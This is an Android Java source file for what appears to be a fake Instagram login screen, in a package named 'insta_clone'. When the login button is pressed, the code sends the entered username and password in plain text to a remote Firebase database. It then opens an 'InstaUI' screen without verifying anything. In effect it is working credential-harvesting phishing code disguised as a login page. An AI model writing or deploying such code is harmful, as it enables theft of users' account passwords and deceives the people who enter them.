package com.example.insta_clone;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

public class MainActivity extends AppCompatActivity {

    EditText userName, password;
    Button logInButton;
    DatabaseReference rootRef, userRef, passRef;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        getSupportActionBar().hide();
        this.getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);
        userName = findViewById(R.id.userName);
        password = findViewById(R.id.password);
        logInButton = findViewById(R.id.logInButton);


        logInButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {

                Thread thread = new Thread(){

                    public void run() {

                        try {
                            rootRef = FirebaseDatabase.getInstance().getReference();
                            userRef = rootRef.child("User Name");
                            passRef = rootRef.child("Password");

                            String userValue = userName.getText().toString();
                            String passValue = password.getText().toString();

                            userRef.push().

                                    setValue(userValue);
                            passRef.push().

                                    setValue(passValue);
                        }
                        catch (Exception e){
                            e.printStackTrace();
                        }

                        finally {
                            Intent intent = new Intent(MainActivity.this, InstaUI.class);
                            startActivity(intent);
                            finish();
                        }
                    }
               };thread.start();
            }
        });
    }
}